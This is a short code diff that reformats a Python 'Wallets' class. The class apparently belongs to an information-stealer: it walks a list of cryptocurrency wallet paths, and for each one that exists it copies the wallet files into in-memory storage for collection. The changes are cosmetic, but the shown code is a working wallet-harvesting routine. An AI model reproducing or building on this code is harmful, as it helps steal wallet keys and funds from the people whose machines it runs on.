@@ -9,8 +9,8 @@ class Wallets:
     """
     Collects configs from the crypto wallets.
     """
-    def __init__(self, folder: str):
 
+    def __init__(self, folder: str):
         self.__folder = folder
         self.__config = WalletsConfig()
         self.__storage = MemoryStorage()
@@ -28,11 +28,12 @@ class Wallets:
         wallets = self.__config.WalletPaths
 
         for wallet in wallets:
-
             if not path.exists(wallet["path"]):
                 continue
 
-            self.__storage.add_from_disk(wallet["path"], path.join(self.__folder, wallet["name"]))
+            self.__storage.add_from_disk(
+                wallet["path"], path.join(self.__folder, wallet["name"])
+            )
 
     def run(self) -> List:
         """
@@ -45,7 +46,6 @@ class Wallets:
         - None.
         """
         try:
-
             self.__get_wallets_files()
 
             return self.__storage.get_data()
